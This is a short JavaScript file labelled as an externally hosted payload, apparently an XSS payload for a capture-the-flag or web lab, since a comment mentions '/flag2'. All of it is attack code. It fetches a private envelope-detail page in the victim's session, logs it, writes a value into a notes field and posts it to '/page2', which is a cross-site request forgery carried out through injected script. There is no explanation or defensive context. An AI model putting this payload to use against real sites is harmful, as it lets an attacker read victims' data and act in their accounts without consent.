// In payload.js (hosted externally)
fetch('/virtualizedmail/envelopeDetail?3475463')
    .then(response => response.text())
    .then(text => {
        // Process the response from /flag2
        console.log("Response from /virtualizedmail/envelopeDetail?3475463:", text);

        // Potentially trigger some action based on this response
        $("#taNotes").val("Bobby").trigger("input");

        setTimeout(function() {
            $.post("/page2", { envnotes: $("#taNotes").val() }, function(e) {
                $("#divNoteSaved").removeClass("hidden-xs hidden-sm hidden-md hidden-lg");
                console.log("Notes updated successfully!");
            });
        }, 100); // Delay ensures UI updates
    })
    .catch(error => console.error("Error fetching /virtualizedmail/envelopeDetail?3475463:", error));
